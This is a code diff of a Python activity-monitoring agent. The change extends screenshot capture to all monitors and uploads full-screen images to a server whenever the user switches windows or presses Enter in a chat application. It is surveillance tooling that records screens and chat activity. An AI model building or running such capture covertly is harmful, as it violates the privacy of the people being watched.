@@ -72,15 +72,20 @@ class Reporter:
             pass  # 诊断上报失败不应阻塞主流程
 
     def screenshot(self, data: dict):
+        mon_idx = data.get("monitor_index", 0)
+        mon_total = data.get("monitor_total", 1)
         ok = self._post("screenshot", {
             "agent_name": self.agent,
             "type": "screenshot",
             "timestamp": data["timestamp"],
             "image_base64": data["image_base64"],
             "format": data.get("format", "jpeg"),
+            "monitor_index": mon_idx,
+            "monitor_total": mon_total,
         })
         if ok:
-            print(f"  [OK] 截图 {data['timestamp']}")
+            mon_tag = f" [屏{mon_idx+1}/{mon_total}]" if mon_total > 1 else ""
+            print(f"  [OK] 截图 {data['timestamp']}{mon_tag}")
 
     def window(self, data: dict):
         self._post("app_event", {
@@ -181,11 +186,12 @@ def main():
     window = AppTracker(interval=APP_TRACK_INTERVAL)
 
     def on_app_switch_with_screenshot(info):
-        """窗口切换时立即触发一次截图，确保有时间戳接近的截图"""
-        shot_data = screenshot.capture_once()
-        if shot_data:
-            reporter.screenshot(shot_data)
-            info["screenshot_timestamp"] = shot_data["timestamp"]
+        """窗口切换时立即触发截图（全屏），确保有时间戳接近的截图"""
+        shots = screenshot.capture_once()
+        if shots:
+            for shot in shots:
+                reporter.screenshot(shot)
+            info["screenshot_timestamp"] = shots[0]["timestamp"]
         reporter.window(info)
         record_activity()  # 窗口切换也视为活动
 
@@ -198,12 +204,13 @@ def main():
     keyboard_monitor = KeyboardEnterMonitor()
 
     def on_chat_enter(info):
-        """Enter 键在聊天应用中按下 → 立即截图 + 上报事件"""
-        shot_data = screenshot.capture_once()
-        if shot_data:
-            reporter.screenshot(shot_data)
+        """Enter 键在聊天应用中按下 → 立即截图（全屏）+ 上报事件"""
+        shots = screenshot.capture_once()
+        if shots:
+            for shot in shots:
+                reporter.screenshot(shot)
             # 嵌入截图时间戳，供服务端精确关联事件与截图
-            info["screenshot_timestamp"] = shot_data["timestamp"]
+            info["screenshot_timestamp"] = shots[0]["timestamp"]
         reporter.chat_enter(info)
         record_activity()  # 标记活动，触发高频截图
 
